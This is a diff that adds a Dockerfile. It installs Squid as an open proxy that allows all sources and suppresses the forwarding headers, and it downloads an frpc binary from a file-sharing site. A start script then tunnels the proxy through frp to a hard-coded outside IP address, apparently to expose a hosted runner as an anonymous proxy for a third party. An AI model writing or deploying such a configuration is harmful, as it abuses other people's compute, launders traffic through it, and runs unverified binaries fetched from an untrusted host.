@@ -1,0 +1,46 @@
+FROM --platform=linux/amd64 ubuntu:22.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+RUN apt-get update && apt-get install -y squid wget curl
+
+RUN echo 'http_port 3128' > /etc/squid/squid.conf && \
+    echo 'acl allsrc src all' >> /etc/squid/squid.conf && \
+    echo 'http_access allow allsrc' >> /etc/squid/squid.conf && \
+    echo 'forwarded_for off' >> /etc/squid/squid.conf && \
+    echo 'via off' >> /etc/squid/squid.conf && \
+    echo 'visible_hostname localhost' >> /etc/squid/squid.conf
+
+RUN wget "https://files.catbox.moe/za4auo.gz" && \
+    gunzip za4auo.gz && \
+    tar -xf za4auo && \
+    mv frp_0.61.2_linux_amd64/frpc /usr/local/bin/frpc && \
+    rm -rf frp_0.61.2_linux_amd64 za4auo
+
+RUN echo '#!/bin/bash' > /start.sh && \
+    echo 'set -e' >> /start.sh && \
+    echo 'service squid start' >> /start.sh && \
+    echo 'sleep 2' >> /start.sh && \
+    echo 'cat > frpc.toml <<FRP' >> /start.sh && \
+    echo 'serverAddr = "45.144.53.63"' >> /start.sh && \
+    echo 'serverPort = 7000' >> /start.sh && \
+    echo 'auth.method = "token"' >> /start.sh && \
+    echo "auth.token = \"\$TOKEN\"" >> /start.sh && \
+    echo '[[proxies]]' >> /start.sh && \
+    echo 'name = "github-squid-6018-r1"' >> /start.sh && \
+    echo 'type = "tcp"' >> /start.sh && \
+    echo 'localIP = "127.0.0.1"' >> /start.sh && \
+    echo 'localPort = 3128' >> /start.sh && \
+    echo 'remotePort = 6018' >> /start.sh && \
+    echo 'FRP' >> /start.sh && \
+    echo 'frpc -c frpc.toml &' >> /start.sh && \
+    echo 'sleep 5' >> /start.sh && \
+    echo 'while true; do' >> /start.sh && \
+    echo '  if ! pgrep squid > /dev/null; then' >> /start.sh && \
+    echo '    service squid restart' >> /start.sh && \
+    echo '  fi' >> /start.sh && \
+    echo '  sleep 30' >> /start.sh && \
+    echo 'done' >> /start.sh && \
+    chmod +x /start.sh
+
+CMD ["/bin/bash", "/start.sh"]
